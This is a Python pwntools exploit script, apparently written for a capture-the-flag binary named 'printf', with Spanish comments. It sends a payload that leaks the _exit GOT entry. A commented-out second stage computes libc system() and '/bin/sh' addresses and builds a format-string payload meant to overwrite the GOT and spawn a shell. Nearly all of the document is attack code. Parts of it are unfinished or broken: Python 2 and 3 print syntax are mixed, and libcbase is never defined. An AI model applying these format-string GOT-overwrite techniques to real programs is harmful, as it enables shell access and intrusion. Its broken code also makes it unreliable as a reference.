from pwn import *
import struct
import time


libc = ELF('libc.so')
elf = ELF('printf')
p = process('./printf')
#p = remote('127.0.0.1', 10003)
plt_exit = elf.symbols['_exit']
got_exit = elf.got['_exit']

got_base=0x00004f78
plt_base=0x0000001020
l = lambda x : struct.pack("<Q",x)
#  [22] .got              PROGBITS         0000000000004f78  00003f78
#  [12] .plt              PROGBITS         0000000000001020  00001020
#	libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007f92921f4000)



p.recvline()#whats your name? 	###ok
b=int(got_exit)+int(got_base)
print("b: ",l(b))
payload1 = l(b)
payload2 = 'A'*(255-8)
payload = payload1+payload2
###########system
p.write(payload)
#time.sleep(1)    #firstintput #READ 1 ##################################################################   INPUT 1
#print("*** enviado payload1 *************** ")
print("[+] Recibido 2: ",p.recvline())#hi, WRITE 3  #####   HI,      %%%%%%%%%%
address_gotexit= (p.recvline())
# print "[+] address_gotexit: ",hex(address_gotexit) #############   PRINT YOUR NAME  #########################################   ADDR_GOEXIT

# ##sacar system ahora si TODO OKEY AQUI

# print "\n###calcu|ting system() addr and \"/bin/sh\" addr...###" ############################################# CALCULAR SYSTEM
# libcexit=libc.symbols['_exit'] 
# libcexit=l(libcexit+plt_base)
# print " [+] libc exit "+hex(libcexit)####PRINT LIBC EXIT
# libcsystem=libc.symbols['system']
# libcexit=l(libcsystem+libcbase)
# print "[+] libcsystem "+hex(libcsystem)####PRINT LIBC SYSTEM
# resta=libcexit-libcsystem
# system_addr = l(resta-int(address_gotexit,16))	
# print("[+] system: "+hex(system_addr)) ##########################################################################################


# ##ahora el sh!

# binsh_addr =  l(int(address_gotexit,16) - (libc.symbols['_exit'] - next(libc.search('/bin/sh')))) ############## BUSCANDO /BIN/SH ###
# print 'binsh_addr= ' + hex(binsh_addr)
# ############################################################################################################## LISTO##############
# ##ahora el payload

# exp=""             ########################################################################################### EXPLOIT ##########
# exp+=l(address_gotexit)#primero poner el got que sera el 7 para sobrescribirlo con system
# exp+=l("\x00\x00\x00\x00\x00\x00\x00\x00")				#despues un return x
# exp+=binsh_addr	#despues "/bin/sh" #24 bits aqui
# exp1="%7${}x".format(int(system_addr,10))
# exp+=("B"*(255-24-len(exp1)))+exp1
# # exp+="%8$0x".
# # exp+="%9${}x".format(binsh_addr)
# payload2 = exp ###################################################################################################################

# #segunda parte
# print("[+] recibiendo... ")
# print("[+] recibido [DO YOU LEAVE...]: "+p.recvline())#                WRITE 7SIGUE INPUT
# print "###sending payload2 ...###"
# print("[+] payload: ",payload2)
# p.send(payload2)                 #INPUT 2
# print("se envio")
# p.recv()
